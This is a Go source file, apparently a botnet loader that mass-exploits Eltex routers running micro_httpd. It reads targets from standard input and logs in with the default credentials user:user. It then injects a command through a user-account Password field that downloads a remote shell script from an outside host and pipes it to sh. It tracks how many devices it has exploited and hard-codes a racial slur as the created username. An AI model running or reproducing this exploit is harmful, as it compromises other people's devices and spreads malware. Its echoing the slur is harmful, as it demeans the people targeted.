package main

import (
	"net"
	"os"
	"crypto/tls"
	"time"
	"fmt"
	"strings"
	"sync"
	"bufio"
	"io"
	"bytes"
	"strconv"
)

var (
	port = os.Args[1]
	protocol = os.Args[2]

	wg sync.WaitGroup

	timeout = 10 * time.Second

	processed uint64
	found uint64
	exploited uint64

	conf = &tls.Config{
		InsecureSkipVerify: true,
	}

	payload = "wget%20-O-%20http%3A%2F%2F1.1.1.1%2Fshfile%7Csh"

	addUsername = "nigger"
	addVolumeName = "nigger"
)

func loginDevice(target string) string {
	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return ""
	}

	defer conn.Close()

	data := "username=user&password=user"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /login HTTP/1.1\r\nContent-Length: " + cntLen + "\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "Set-Cookie: SESSIONID=") {
		cookieStr := strings.Split(buff.String(), "Set-Cookie: SESSIONID=")

		if len(cookieStr) > 1 {
			cookie := strings.Split(cookieStr[1], ";")

			if len(cookie) > 0 {
				return cookie[0]
			}
		}
	}

	return ""
}

func findDevice(target string) bool {
	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "Server: micro_httpd")
}

func removeOldUser(target, cookie, sessionID string) {
	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("GET /storageuseraccountcfg.cmd?action=remove&rmLst=" + addUsername + "&sessionKey=" + sessionID + " HTTP/1.1\r\nHost: " + target + "\r\nReferer: http://" + target + "/storageuseraccountcfg.cmd?view\r\nCookie: SESSIONID=" + cookie + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func sendPayload(target, cookie, sessionID string) {
	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("GET /storageuseraccountcfg.cmd?action=add&userName=" + addUsername + "&Password=%24(" + payload + ")&volumeName=" + addVolumeName + "&sessionKey=" + sessionID + " HTTP/1.1\r\nReferer: http://" + target + "/storageusraccadd.html\r\nHost: " + target + "\r\nCookie: SESSIONID=" + cookie + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func getSessionID(target, cookie string) string {
	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return ""
	}

	defer conn.Close()

	conn.Write([]byte("GET /storageusraccadd.html HTTP/1.1\r\nHost: " + target + "\r\nReferer: http://" + target + "/storageuseraccountcfg.cmd?view\r\nUser-Agent: Hello World\r\nCookie: SESSIONID=" + cookie + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "var sessionKey='") {
		sessionStr := strings.Split(buff.String(), "var sessionKey='")

		if len(sessionStr) > 1 {
			session := strings.Split(sessionStr[1], "'")

			if len(session) > 0 {
				return session[0]
			}
		}
	}

	return ""
}

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()

	if !findDevice(target) {
		return
	}

	found++

	cookie := loginDevice(target)

	if cookie == "" {
		return
	}

	fmt.Printf("[ELTEX] logged in with user:user on %s (cookie=\"%s\")\n", target, cookie)

	sessionID := getSessionID(target, cookie)

	if sessionID == "" {
		return
	}

	removeOldUser(target, cookie, sessionID)

	sessionID = getSessionID(target, cookie)

	if sessionID == "" {
		return
	}

	sendPayload(target, cookie, sessionID)

	fmt.Printf("[ELTEX] sent payload to %s with user:user\n", target)
	exploited++
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Found: %d | Exploited: %d\n", processed, found, exploited)
		time.Sleep(1 * time.Second)
	}
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()


	for scanner.Scan() {


		if port == "manual" {
			go exploitDevice(scanner.Text())
		} else {
			go exploitDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
